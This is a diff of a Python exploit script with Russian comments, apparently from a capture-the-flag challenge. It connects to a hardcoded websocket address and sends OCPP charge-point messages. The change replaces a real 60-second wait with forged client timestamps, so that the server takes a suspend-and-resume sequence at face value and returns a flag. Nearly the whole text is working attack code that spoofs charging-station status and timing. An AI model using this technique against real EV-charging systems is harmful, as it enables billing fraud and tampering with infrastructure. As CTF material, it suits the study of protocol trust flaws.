@@ -165,41 +165,52 @@ if __name__ == "__main__":
 import asyncio
 import websockets
 import json
+from datetime import datetime, timedelta, timezone
 
 async def exploit():
     uri = "ws://154.57.164.82:30129/Monastiraki"
     
-    print("1. Подключаемся к сокету...")
+    # Генерируем идеальные тайминги с разницей ровно в 60 секунд
+    now = datetime.now(timezone.utc)
+    t1 = now.strftime("%Y-%m-%dT%H:%M:%S.000Z")
+    t2 = (now + timedelta(seconds=60)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
+
+    print("1 Подключаемся к сокету...")
     async with websockets.connect(uri) as websocket:
         
-        # Авторизуем станцию
         boot_msg = [2, "msg-1", "BootNotification", {"chargePointVendor": "VoltGrid", "chargePointModel": "V1"}]
         await websocket.send(json.dumps(boot_msg))
         print(f"<- {await websocket.recv()}")
 
-        # Останавливаем транзакцию
-        print("2. Отправляем SuspendedEVSE...")
-        suspend_msg = [2, "msg-2", "StatusNotification", {"connectorId": 1, "errorCode": "NoError", "status": "SuspendedEVSE"}]
+        print(f"2 Отправляем SuspendedEVSE со временем {t1}...")
+        suspend_msg = [2, "msg-2", "StatusNotification", {
+            "connectorId": 1, 
+            "errorCode": "NoError", 
+            "status": "SuspendedEVSE",
+            "timestamp": t1
+        }]
         await websocket.send(json.dumps(suspend_msg))
         print(f"<- {await websocket.recv()}")
 
-        # Идеальный тайминг
-        print("3. Ждем ровно 60 секунд...")
-        await asyncio.sleep(60)
+        # Нам больше не нужно ждать реальную минуту, сервер поверит нашим меткам
+        print("3 Делаем небольшую паузу для порядка...")
+        await asyncio.sleep(2)
 
-        # Возобновляем
-        print("4. Возвращаем статус Charging...")
-        charge_msg = [2, "msg-3", "StatusNotification", {"connectorId": 1, "errorCode": "NoError", "status": "Charging"}]
+        print(f"4 Возвращаем Charging со временем {t2} (ровно +60 сек)...")
+        charge_msg = [2, "msg-3", "StatusNotification", {
+            "connectorId": 1, 
+            "errorCode": "NoError", 
+            "status": "Charging",
+            "timestamp": t2
+        }]
         await websocket.send(json.dumps(charge_msg))
         
-        # Слушаем ответы в поисках флага
-        print("5. Ожидаем флаг...")
+        print("5 Ожидаем ответ от сервера (и флаг!)...")
         while True:
             try:
                 response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                 print(f"<- {response}")
             except asyncio.TimeoutError:
-                print("Таймаут ожидания ответа. Проверь вывод выше.")
                 break
 
 if __name__ == "__main__":
